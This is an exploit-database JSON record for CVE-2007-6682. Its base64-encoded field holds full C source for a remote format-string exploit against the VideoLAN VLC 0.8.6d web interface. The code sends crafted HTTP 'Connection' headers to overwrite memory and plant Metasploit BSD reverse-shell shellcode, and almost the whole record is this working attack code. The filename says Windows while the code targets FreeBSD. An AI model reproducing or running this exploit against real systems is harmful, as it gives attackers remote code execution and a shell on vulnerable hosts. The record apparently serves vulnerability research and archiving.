{
    "source": "exploit-database", 
    "exploit": "LyogRXBpYml0ZSAvLyBiaXRlIHNpbmNlIDE0NDINCiAqIHBvd24gbWVtZSB0YSBtYW1pZQ0KICovDQoNCi8qIEFkdmlzb3J5IGZyb20gTHVpZ2kgQXVyaWVtbWENCiAqIENWRS0yMDA3LTY2ODIgLyBmb3JtYXQgc3RyaW5nIGluIFZpZGVvTEFOIFZMQyAwLjguNmQNCiAqDQogKiBEZXNjcmlwdGlvbiA6DQogKiBGb3JtYXQgc3RyaW5nIHZ1bG5lcmFiaWxpdHkgaW4gdGhlIGh0dHBkX0ZpbGVDYWxsQmFjaw0KICogZnVuY3Rpb24gKG5ldHdvcmsvaHR0cGQuYykgaW4gVmlkZW9MQU4gVkxDIDAuOC42ZCBhbGxvd3MNCiAqIHJlbW90ZSBhdHRhY2tlcnMgdG8gZXhlY3V0ZSBhcmJpdHJhcnkgY29kZSB2aWEgZm9ybWF0DQogKiBzdHJpbmcgc3BlY2lmaWVycyBpbiB0aGUgQ29ubmVjdGlvbiBwYXJhbWV0ZXIuDQogKi8NCg0KLyogTGEgZmFpbGxlIG4nYSBkJ2ludGVyZXQgcXVlIGRhbnMgdW4gYnV0IGQnYXBwcmVudGlzc2FnZQ0KICogZCd1bmUgdGVjaG5pcXVlIGF2YW5jZSBkJ2V4cGxvaXRhdGlvbiBkZXMgY2hhaW5lcyBkZQ0KICogZm9ybWF0Lg0KICoNCiAqIFRvdXRlIGxhIGRpZmZpY3VsdGUgZGUgbCdleHBsb2l0YXRpb24gZXN0IGxpZWUgYXUgZmFpdA0KICogcXVlIGxhIGNoYWluZSBkZSBmb3JtYXQgc2UgdHJvdXZlIGRhbnMgdW4gdGhyZWFkLCBldA0KICogbGEgcGlsZSByZW1wbGllIGF2ZWMgZGVzIGFkcmVzc2VzIGR1IHRhcy4NCiAqIE9uIGVzdCBkb25jIG9ibGlnZSBkJ3V0aWxpc2VyIGxhIHRlY2huaXF1ZSBkaXRlIGRlDQogKiAibCdlYnAgY2hhaW5pbmciLg0KICoNCiAqIE9uIHBhcmRvbm5lcmEgbGUgbWFucXVlIGRlIHByb3ByZXRlIGV0IGRlIHBvcnRhYmlsaXRlLA0KICogZGVmYXV0cyBxdWkgc29udCBleHBsaXF1ZXMgZXQgY29ycmlnZXMgZHVyYW50IHNvbg0KICogdXRpbGlzYXRpb24gc3VyIGxhIHBsYXRlZm9ybWUgZGUgdHV0b3JpYXV4IGRlDQogKiBsJ0VwaXRlY2ggU2VjdXJpdHkgTGFib3JhdG9yeS4NCiAqLw0KDQovKiBUcmFkdWN0aW9uOg0KICogVGhpcyBpcyB1Z2x5IGFuZCBub3QgY3Jvc3MgcGxhdGVmb3JtLCB1c2UgaXQgZm9yDQogKiBsZWFybmluZyBwdXJwb3NlLiAoXi1eKQ0KICovDQoNCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN0cmluZ3MuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCg0KaW50CWNvbm5lY3RfKGNoYXIgKiwgaW50KTsNCnZvaWQJZXhpdF8oaW50LCBjaGFyICopOw0KY2hhcgkqZ2V0X3BheWxvYWQodW5zaWduZWQgc2hvcnQsIHVuc2lnbmVkIHNob3J0LyogLCB1bnNpZ25lZCBzaG9ydCAqICovKTsNCnZvaWQJcHJvZ3Jlc3NiYXIodm9pZCk7DQp2b2lkCXdyaXRlX3Nob3J0KHVuc2lnbmVkIHNob3J0LCB1bnNpZ25lZCBzaG9ydCk7DQoNCiNkZWZpbmUgUkVRVUVTVCAiR0VUIC8gSFRUUC8xLjBcclxuIiBcDQogICAgICAgICAgICAgICAgIkNvbm5lY3Rpb246ICINCg0KLyogQ2hhaW5pbmcgZWJwIC8vIEZSRUVCU0Q4IC0gMC44LjZkIDoNCiAqDQogKiAgKDB4YmY1ZmE4MzgpIC0+IDB4YmY1ZmFmYTggIC8vIDEyJCAgaHR0cGRfRmlsZUNhbGxCYWNrKCkNCiAqICAgICAgICAgX19fX19fX19fX19fXy8NCiAqICAgICAgICAvDQogKiAgKDB4YmY1ZmFmYTgpIC0+IDB4YmY1ZmFmZTggIC8vIDQ4OCQgaHR0cGRfSG9zdFRocmVhZCgpDQogKiAgICAgICAgIF9fX19fX19fX19fX18vDQogKiAgICAgICAgLw0KICogICgweGJmNWZhZmU4KSAtPiAweDAwMDAwMDAwICAvLyA1MDQkIHB0aHJlYWRfZ2V0cHJpbygpDQogKg0KICogICgweGJmYmVlMmI4KSAvLyAoYmY1ZillMmI4IGlzIGFuIGVpcCB2YWx1ZQ0KICogICAgICAgICAgICAgICAgICBiZWNhdXNlIHdlIHdyaXRlIHNob3J0IGJ5IHNob3J0LA0KICogICAgICAgICAgICAgICAgICB3ZSd2ZSBqdXN0IGhhdmUgdG8gd3JpdGUgKGJmYmUpDQogKiAgICAgICAgICAgICAgICAgIGluIG9yZGVyIHRvIGhhdmUgdGhlIHNjIGFkZHIuDQogKiAgKDB4YmY1ZmE4M2MpIC8vIEFuIGVpcCAtPiAxMiQgKyA0DQogKi8NCg0KI2RlZmluZSBGSVJTVF9FQlAJMTINCiNkZWZpbmUgU0VDT05EX0VCUAk0ODgNCiNkZWZpbmUgVEhJUkRfRUJQCTUwNA0KDQojZGVmaW5lIEZCU0Q4X0VTUAkoIDB4YmY1ZmE4MDggKQ0KI2RlZmluZSBGQlNEOF9TQ0FERFIJKCAweGJmYmVlMmI4ICkNCg0KaW50CQlwb3J0Ow0KY2hhcgkJKmlwOw0KDQovKiBic2RfaWEzMl9yZXZlcnNlIC0gTEhPU1Q9MTI3LjAuMC4xIExQT1JUPTQzMjEgU2l6ZT05MiBodHRwOi8vbWV0YXNwbG9pdC5jb20gKi8NCnVuc2lnbmVkIGNoYXIJc2NvZGVbXSA9DQogICJceDMzXHhjOVx4ODNceGU5XHhlZlx4ZDlceGVlXHhkOVx4NzRceDI0XHhmNFx4NWJceDgxXHg3M1x4MTNceDZjIg0KICAiXHgzY1x4NTZceGNjXHg4M1x4ZWJceGZjXHhlMlx4ZjRceDA2XHg1ZFx4MGVceDU1XHgzZVx4N2VceDA0XHg4ZSINCiAgIlx4M2VceDU0XHgyOVx4Y2NceDZjXHgzZFx4OWJceDRjXHgwNFx4MmNceDU0XHhkY1x4OGRceGI1XHhiN1x4YTYiDQogICJceDdjXHg2ZFx4MDZceDlkXHhmYlx4NTZceDM0XHg5NFx4YTFceGJjXHgzY1x4Y2VceDM1XHg4Y1x4MGNceDlkIg0KICAiXHgzYlx4NmRceDliXHg0Y1x4MjVceDQ1XHhhMFx4OWNceDA0XHgxM1x4NzlceGJmXHgwNFx4NTRceDc5XHhhZSINCiAgIlx4MDVceDUyXHhkZlx4MmZceDNjXHg2OFx4MDVceDlmXHhkY1x4MDdceDliXHg0YyI7DQoNCmludAkJCW1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQ0Kew0KICB1bnNpZ25lZCBpbnQJCWk7DQoNCiAgaWYgKGFyZ2MgPCAzKQ0KICAgICh2b2lkKSBleGl0XygxLCAiVXNhZ2U6IGV4cGxvaXQgaXAgcG9ydFxuIik7DQogIGlwID0gYXJndlsxXTsNCiAgcG9ydCA9IGF0b2koYXJndlsyXSk7DQogIHByaW50ZigiWytdIFZpY3RpbSBpcyA6ICVzOiVkLi4uXG4iLCBpcCwgcG9ydCk7DQogIHByaW50ZigiWytdIFNoZWxsY29kZSBzaXplIDogJWQgLy8gbG9jYXRlZCBhdCA6IDB4JTA4eFxuIiwNCgkgc3RybGVuKChjaGFyICopc2NvZGUpLCBGQlNEOF9TQ0FERFIpOw0KICBwcmludGYoIlsrXSBFSVAgaXMgbG9jYXRlZCBhdCA6IDB4JTA4eFxuIiwgRkJTRDhfRVNQICsgRklSU1RfRUJQICogNCArIDQgKyAyKTsNCg0KICAodm9pZCkgd3JpdGVfc2hvcnQoKHVuc2lnbmVkIHNob3J0KShGQlNEOF9FU1AgKyAoVEhJUkRfRUJQICogNCkgKyAyKSwNCgkJICAgICBGSVJTVF9FQlApOw0KICAodm9pZCkgd3JpdGVfc2hvcnQoKHVuc2lnbmVkIHNob3J0KShGQlNEOF9TQ0FERFIgPj4gMTYpLCBTRUNPTkRfRUJQKTsNCiAgKHZvaWQpIHdyaXRlX3Nob3J0KCh1bnNpZ25lZCBzaG9ydCkoRkJTRDhfRVNQICsgKFRISVJEX0VCUCAqIDQpKSwNCgkJICAgICBGSVJTVF9FQlApOw0KDQogIGZvciAoaSA9IDA7IGkgPCBzdHJsZW4oKGNoYXIqKXNjb2RlKTsgaSArPSAyKQ0KICAgIHsNCiAgICAgICh2b2lkKSB3cml0ZV9zaG9ydCgodW5zaWduZWQgc2hvcnQpKEZCU0Q4X1NDQUREUiArIGkpLCBTRUNPTkRfRUJQKTsNCiAgICAgICh2b2lkKSB3cml0ZV9zaG9ydCgodW5zaWduZWQgc2hvcnQpKCooKHVuc2lnbmVkIHNob3J0ICopKHNjb2RlICsgaSkpKSwNCgkJCSBUSElSRF9FQlApOw0KICAgIH0NCg0KICAodm9pZCkgd3JpdGVfc2hvcnQoKHVuc2lnbmVkIHNob3J0KShGQlNEOF9FU1AgKyAoVEhJUkRfRUJQICogNCkgKyAyKSwNCgkJICAgICBGSVJTVF9FQlApOw0KICAodm9pZCkgd3JpdGVfc2hvcnQoKHVuc2lnbmVkIHNob3J0KShGQlNEOF9FU1AgPj4gMTYpLCBTRUNPTkRfRUJQKTsNCiAgKHZvaWQpIHdyaXRlX3Nob3J0KCh1bnNpZ25lZCBzaG9ydCkoRkJTRDhfRVNQICsgKFRISVJEX0VCUCAqIDQpKSwgRklSU1RfRUJQKTsNCiAgKHZvaWQpIHdyaXRlX3Nob3J0KCh1bnNpZ25lZCBzaG9ydCkoRkJTRDhfRVNQICsgRklSU1RfRUJQICogNCArIDQgKyAyKSwNCgkJICAgICBTRUNPTkRfRUJQKTsNCiAgKHZvaWQpIHdyaXRlX3Nob3J0KCh1bnNpZ25lZCBzaG9ydCkoRkJTRDhfU0NBRERSID4+IDE2KSwgVEhJUkRfRUJQKTsNCg0KICBwcmludGYoIlsrXSBEb25lLlxuIik7DQogIHJldHVybiAoMCk7DQp9DQoNCmNoYXIJCSpnZXRfcGF5bG9hZCh1bnNpZ25lZCBzaG9ydCBkYXRhLA0KCQkJICAgICB1bnNpZ25lZCBzaG9ydCBwb3ANCgkJCSAgICAgLyogdW5zaWduZWQgc2hvcnQgKm9mZnNldCAqLykNCnsNCiAgc3RhdGljIGNoYXIJYnVmZmVyWzMyXTsNCiAgY2hhcgkJYnVmZmlbOV07DQoNCiAgLyogZGF0YSA9IGRhdGEgLSAqb2Zmc2V0OyAqLw0KICBpZiAoKHVuc2lnbmVkIHNob3J0KWRhdGEgPCA4KQ0KICAgIHsNCiAgICAgIG1lbXNldChidWZmaSwgJzAnLCA5KTsNCiAgICAgIGJ1ZmZpW2RhdGFdID0gJ1wwJzsNCiAgICAgIHNwcmludGYoYnVmZmVyLCAiJXMlJSVkJGhuIiwgYnVmZmksIHBvcCk7DQogICAgfQ0KICBlbHNlDQogICAgc3ByaW50ZihidWZmZXIsICIlJSVkdSUlJWQkaG4iLCBkYXRhLCBwb3ApOw0KICAvKiAqb2Zmc2V0ID0gKm9mZnNldCArIGRhdGE7ICovDQogIHJldHVybiAoYnVmZmVyKTsNCn0NCg0Kdm9pZAl3cml0ZV9zaG9ydCh1bnNpZ25lZCBzaG9ydCBkYXRhLCB1bnNpZ25lZCBzaG9ydCBwb3ApDQp7DQogIGNoYXIJYnVmZlsxMDI0XTsNCiAgaW50CXJldDsNCiAgaW50CXNvY2s7DQoNCiAgbWVtc2V0KGJ1ZmYsICdcMCcsIDQyKTsNCiAgc3RyY2F0KGJ1ZmYsIFJFUVVFU1QpOw0KICBzdHJjYXQoYnVmZiwgZ2V0X3BheWxvYWQoZGF0YSwgcG9wKSk7DQogIHN0cmNhdChidWZmLCAiXHJcblxyXG4iKTsNCiAgc29jayA9IGNvbm5lY3RfKGlwLCBwb3J0KTsNCiAgaWYgKHdyaXRlKHNvY2ssIGJ1ZmYsIHN0cmxlbihidWZmKSkgPCAoaW50KXN0cmxlbihidWZmKSkNCiAgICAodm9pZCkgZXhpdF8oMSwgIlstXSB3cml0ZSgpXG4iKTsNCiAgd2hpbGUgKChyZXQgPSByZWFkKHNvY2ssIGJ1ZmYsIDEwMjQpKSkNCiAgICA7DQogIGlmIChjbG9zZShzb2NrKSA8IDApDQogICAgKHZvaWQpIGV4aXRfKDEsICJbLV0gY2xvc2UoKVxuIik7DQogIHJldHVybiA7DQp9DQoNCnZvaWQJZXhpdF8oaW50IGksIGNoYXIgKnR5b3ApDQp7DQogIHdyaXRlKDIsIHR5b3AsIHN0cmxlbih0eW9wKSk7DQogICh2b2lkKSBleGl0KGkpOw0KfQ0KDQppbnQJCQljb25uZWN0XyhjaGFyICppcCwgaW50IHBvcnQpDQp7DQogIGludAkJCXNvY2s7DQogIHN0cnVjdCBzb2NrYWRkcl9pbglzOw0KDQogICh2b2lkKSBwcm9ncmVzc2JhcigpOw0KICBpZiAoKHNvY2sgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApKSA8IDApDQogICAgKHZvaWQpIGV4aXRfKDEsICJbLV0gc29ja2V0KClcbiIpOw0KICBiemVybygmcywgc2l6ZW9mKHMpKTsNCiAgcy5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiAgcy5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOw0KICBzLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihpcCk7DQogIGlmIChjb25uZWN0KHNvY2ssIChzdHJ1Y3Qgc29ja2FkZHIgKikmcywgc2l6ZW9mKHMpKSA8IDApDQogICAgKHZvaWQpIGV4aXRfKDEsICJbLV0gY29ubmVjdCgpXG4iKTsNCiAgcmV0dXJuIChzb2NrKTsNCn0NCg0Kdm9pZAkJCXByb2dyZXNzYmFyKHZvaWQpDQp7DQogIHN0YXRpYyB1bnNpZ25lZCBpbnQJYyA9IDA7DQoNCiAgd3JpdGUoMSwgIkQgICAgICAgIiwgMTINCgktIHdyaXRlKDEsICJbP10gOD09PT09IiwgNSArICgoYyA+PiAyICYgMSA/IC0xIDogMSkNCgkJCQkgICAgICAqICgrK2MgJiAzKQ0KCQkJCSAgICAgICsgKGMgJSAweDIwICYgMTAwKSkpKTsNCiAgd3JpdGUoMSwgInAwd24gaW4gcHJvZ3Jlc3MiLCAxOSk7DQogIHdyaXRlKDEsICIuLi4iLCBjIC8gNCAlIDQpOw0KICB3cml0ZSgxLCAiICAgXHIiLCA0KTsNCiAgcmV0dXJuIDsNCn0NCg0KLy8gbWlsdzBybS5jb20gWzIwMDgtMDQtMjhd", 
    "filename": "platforms/windows/remote/5519.c", 
    "id": "5519", 
    "cves": [
        "CVE-2007-6682"
    ]
}